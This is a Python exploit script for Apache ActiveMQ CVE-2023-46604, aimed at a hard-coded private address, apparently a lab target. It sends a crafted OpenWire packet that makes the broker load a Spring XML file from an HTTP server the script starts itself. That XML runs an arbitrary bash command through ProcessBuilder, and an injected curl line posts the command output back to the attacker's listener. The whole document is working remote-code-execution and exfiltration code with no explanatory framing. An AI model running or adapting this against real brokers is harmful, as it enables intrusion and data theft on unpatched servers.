#!/usr/bin/env python3
"""One-shot command execution via ActiveMQ CVE-2023-46604, prints exfil."""
import html, http.server, socket, threading, sys

TARGET, TPORT, LPORT = "172.28.9.3", 61616, 8001
CMD = sys.argv[1] if len(sys.argv) > 1 else "id"
WAIT = float(sys.argv[2]) if len(sys.argv) > 2 else 25

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((TARGET, TPORT)); OUR_IP = s.getsockname()[0]; s.close()

SCRIPT = ("curl -s -m 8 --data-binary \"$(%s)\" http://%s:%d/exfil || true"
          % (CMD, OUR_IP, LPORT))

XML = ('<beans xmlns="http://www.springframework.org/schema/beans" '
       'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
       'xsi:schemaLocation="http://www.springframework.org/schema/beans '
       'http://www.springframework.org/schema/beans/spring-beans.xsd">'
       '<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">'
       '<constructor-arg><list><value>bash</value><value>-c</value>'
       '<value>' + html.escape(SCRIPT) + '</value></list></constructor-arg></bean></beans>')

got = threading.Event()


class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/poc.xml"):
            d = XML.encode()
            self.send_response(200); self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(d))); self.end_headers()
            self.wfile.write(d)
        else:
            self.send_response(200); self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        print(self.rfile.read(n).decode(errors="replace"), flush=True)
        got.set()
        self.send_response(200); self.end_headers()

    def log_message(self, *x):
        pass


def ps(v):
    r = v.encode(); return len(r).to_bytes(2, "big") + r


def mk(url):
    cls = "org.springframework.context.support.ClassPathXmlApplicationContext"
    body = bytes.fromhex("1f00000000000000000001") + b"\x01" + ps(cls) + b"\x01" + ps(url)
    return len(body).to_bytes(4, "big") + body


srv = http.server.ThreadingHTTPServer(("0.0.0.0", LPORT), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
with socket.create_connection((TARGET, TPORT), timeout=10) as c:
    c.sendall(mk("http://%s:%d/poc.xml" % (OUR_IP, LPORT)))
if not got.wait(WAIT):
    print("[-] timeout", flush=True)
srv.shutdown()
